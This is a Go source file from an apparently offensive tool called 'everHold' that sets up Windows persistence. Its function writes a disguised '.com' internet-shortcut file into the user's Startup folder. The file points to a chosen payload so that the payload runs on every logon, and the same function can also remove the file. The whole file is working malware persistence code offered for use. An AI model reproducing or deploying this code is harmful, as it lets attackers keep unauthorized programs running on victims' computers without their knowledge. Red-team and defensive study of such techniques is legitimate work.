package persist

import (
	"everHold/src/conf"
	"everHold/src/utils"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
)

type Payload struct {
	Path string
}

func getAppDataPath() (string, error) {
	usr, err := user.Current()
	if err != nil {
		return "", err
	}
	return filepath.Join(usr.HomeDir, "AppData", "Roaming"), nil
}

func getPayloadPath(payload string) (string, bool) {
	// Here you can add any logic to validate or manipulate the payload path
	if _, err := os.Stat(payload); err == nil {
		return payload, true
	}
	return "", false
}

func persistInkStartup(payload string, name string, add bool) bool {
	appdata, err := getAppDataPath()
	if err != nil {
		utils.PrintError("Failed to get AppData path: " + err.Error())
		return false
	}

	startupDir := filepath.Join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	if _, err := os.Stat(startupDir); os.IsNotExist(err) {
		utils.PrintError("Startup directory not found: " + startupDir)
		return false
	}

	startupFilePath := filepath.Join(startupDir, fmt.Sprintf("%s.com", name))
	if add {
		payloadPath, valid := getPayloadPath(payload)
		if valid {
			file, err := os.Create(startupFilePath)
			if err != nil {
				utils.PrintError("Failed to create startup file: " + err.Error())
				return false
			}
			defer file.Close()
			_, err = file.WriteString(fmt.Sprintf("\n[InternetShortcut]\nURL=file:///%s\n", payloadPath))
			if err != nil {
				utils.PrintError("Failed to write to startup file: " + err.Error())
				return false
			}
			utils.PrintSuccess("Startup file created: " + startupFilePath)
			utils.PrintSuccess("payload will run when restart ")
			return true
		} else {
			utils.PrintError("Cannot proceed, invalid payload")
			return false
		}
	} else {
		utils.PrintInfo("Removing startup file (" + startupFilePath + ")")
		err := os.Remove(startupFilePath)
		if err != nil {
			utils.PrintError("Unable to remove persistence: " + err.Error())
			return false
		}
		utils.PrintSuccess("Successfully removed persistence")
		return true
	}
}

func Callmethod1(newcmd *conf.RUNCMD) bool {
	success := persistInkStartup(newcmd.PayloadValue, newcmd.NameValue, newcmd.AddValue)
	return success
}
